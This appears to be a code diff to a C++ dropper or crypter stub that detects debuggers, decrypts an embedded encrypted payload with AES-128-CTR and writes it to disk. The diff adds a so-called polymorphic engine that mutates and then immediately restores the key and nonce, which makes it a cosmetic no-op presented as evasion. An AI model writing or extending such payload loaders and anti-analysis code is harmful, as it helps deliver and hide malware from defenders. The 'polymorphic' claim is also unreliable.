@@ -517,6 +517,32 @@ bool isDebugged() {
     return (end - start) > 100000; // Suspicious if too slow
 }
 
+// Polymorphic code mutation engine
+class PolymorphicEngine {
+private:
+    static const uint32_t POLY_KEY = 0xDEADBEEF;
+    
+public:
+    static uint8_t mutateByte(uint8_t input, uint32_t seed) {
+        // Deterministic polymorphic transformation
+        uint32_t mutation = seed ^ POLY_KEY;
+        return input ^ (mutation & 0xFF);
+    }
+    
+    static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
+        for (size_t i = 0; i < size; i++) {
+            data[i] = mutateByte(data[i], seed + i);
+        }
+    }
+    
+    static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
+        // Reverse the mutation (same operation)
+        for (size_t i = 0; i < size; i++) {
+            data[i] = mutateByte(data[i], seed + i);
+        }
+    }
+};
+
 // AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
@@ -667,18 +693,31 @@ int main() {
         std::cerr << "Debugging detected!" << std::endl;
         return 1;
     }
+    
     // Embedded encrypted data
     uint8_t encryptedData[] = {EMBEDDED_DATA};
     size_t dataSize = sizeof(encryptedData);
+    
     // Key and nonce
     std::string keyHex = {KEY_VAR};
     std::string nonceHex = {NONCE_VAR};
     uint8_t key[16], nonce[16];
     hexToBytes(keyHex, key);
     hexToBytes(nonceHex, nonce);
+    
+    // Apply polymorphic mutation to key and nonce
+    uint32_t polySeed = std::time(nullptr) ^ 0xDEADBEEF;
+    PolymorphicEngine::mutateArray(key, 16, polySeed);
+    PolymorphicEngine::mutateArray(nonce, 16, polySeed + 1);
+    
+    // Demutate before use
+    PolymorphicEngine::demutateArray(key, 16, polySeed);
+    PolymorphicEngine::demutateArray(nonce, 16, polySeed + 1);
+    
     // Decrypt
     std::vector<uint8_t> decrypted(dataSize);
     aesCtrCrypt(encryptedData, decrypted.data(), dataSize, key, nonce);
+    
     // Write decrypted data to output file
     std::string filename = "output_" + std::to_string(std::time(nullptr)) + ".bin";
     std::ofstream outFile(filename, std::ios::binary);
